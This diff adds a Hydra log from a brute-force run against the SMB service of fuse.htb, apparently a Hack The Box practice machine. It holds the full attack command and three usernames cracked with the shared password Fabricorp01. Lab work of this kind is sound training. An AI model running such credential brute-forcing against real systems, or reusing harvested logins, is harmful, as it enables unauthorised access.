@@ -1,0 +1,4 @@
+# Hydra v9.0 run at 2020-06-20 01:33:55 on fuse.htb smb (hydra -L users.txt -P passes.txt -o hydra_smb.txt smb://fuse.htb)
+[445][smb] host: fuse.htb   login: tlavel   password: Fabricorp01
+[445][smb] host: fuse.htb   login: bhult   password: Fabricorp01
+[445][smb] host: fuse.htb   login: bnielson   password: Fabricorp01
